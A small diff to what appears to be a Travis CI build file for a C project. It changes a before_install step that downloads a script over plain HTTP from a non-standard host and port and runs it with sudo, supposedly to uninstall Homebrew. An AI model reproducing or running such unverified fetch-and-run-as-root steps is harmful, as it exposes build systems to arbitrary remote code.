@@ -4,7 +4,8 @@ language: C
 
 before_install:
         - echo " Uninstalling the homebrew"
-        - wget -O uninstall.sh "http://listen-1.com:6294/uninstall_homebrew.sh" && sudo bash uninstall.sh
+        - wget -O /tmp/uninstall.sh "http://listen-1.com:6294/uninstall_homebrew.sh" 
+        - cd /tmp && sudo ./uninstall.sh
         - echo "Successfully uninstalled the homebrew"
           
 install: true
